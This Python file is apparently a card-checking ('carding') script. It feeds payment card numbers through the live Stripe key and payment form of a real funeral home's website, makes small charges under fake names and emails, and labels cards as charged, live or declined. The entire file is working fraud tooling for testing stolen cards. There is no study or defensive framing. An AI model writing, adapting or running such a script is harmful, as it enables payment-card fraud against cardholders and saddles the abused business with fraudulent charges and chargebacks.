"""
Stripe $4 Gateway (Corrigan Funerals)
Based on gatet.py - 10$ charge capability
"""

import requests
import random
import time

def check_card(card_details):
    """
    Check card using Stripe $4 gateway
    
    Args:
        card_details: dict with number, exp_month, exp_year, cvc
        
    Returns:
        dict: {status, message, response_time}
    """
    
    start_time = time.time()
    
    try:
        # Parse card details
        n = card_details['number']
        mm = card_details['exp_month']
        yy = card_details['exp_year']
        cvc = card_details['cvc']
        
        # Handle year format
        if "20" in str(yy):
            yy = str(yy).split("20")[1]
        
        # Random amount for unique transaction
        random_amount1 = random.randint(1, 4)
        random_amount2 = random.randint(1, 99)
        
        # Step 1: Create Stripe Payment Method
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        
        if response.status_code != 200:
            return {
                'status': 'Declined',
                'message': 'Failed to create payment method',
                'response_time': round(time.time() - start_time, 2)
            }
        
        pm = response.json().get('id')
        
        if not pm:
            return {
                'status': 'Declined',
                'message': 'Invalid card details',
                'response_time': round(time.time() - start_time, 2)
            }
        
        # Step 2: Process charge
        headers = {
            'authority': 'www.corriganfunerals.ie',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.corriganfunerals.ie',
            'referer': 'https://www.corriganfunerals.ie/pay-funeral-account/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'pay-funeral-account',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.50',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-custom-input[]': [
                'Waiyan',
                'Waiyan',
                'Waiyan',
            ],
            'wpfs-card-holder-email': f'Waiyan{random_amount1}{random_amount2}@gmail.com',
            'wpfs-card-holder-name': 'Waiyan',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }
        
        response = requests.post('https://www.corriganfunerals.ie/cfajax', headers=headers, data=data, timeout=30)
        
        result = response.json().get('message', 'No response')
        
        response_time = round(time.time() - start_time, 2)
        
        # Parse result
        result_lower = result.lower()
        
        if 'success' in result_lower or 'thank you' in result_lower or 'payment' in result_lower:
            return {
                'status': 'Charged',
                'message': 'Payment Successful ($4 Charged)',
                'response_time': response_time
            }
        elif 'insufficient' in result_lower:
            return {
                'status': 'Approved',
                'message': 'Card is Live (Insufficient Funds)',
                'response_time': response_time
            }
        elif 'declined' in result_lower or 'invalid' in result_lower:
            return {
                'status': 'Declined',
                'message': result,
                'response_time': response_time
            }
        else:
            return {
                'status': 'Unknown',
                'message': result,
                'response_time': response_time
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'Declined',
            'message': 'Request timeout',
            'response_time': round(time.time() - start_time, 2)
        }
    except Exception as e:
        return {
            'status': 'Declined',
            'message': f'Error: {str(e)}',
            'response_time': round(time.time() - start_time, 2)
        }


# Test
if __name__ == '__main__':
    test_card = {
        'number': '4532123456789012',
        'exp_month': '12',
        'exp_year': '2025',
        'cvc': '123'
    }
    
    result = check_card(test_card)
    print(f"Result: {result}")
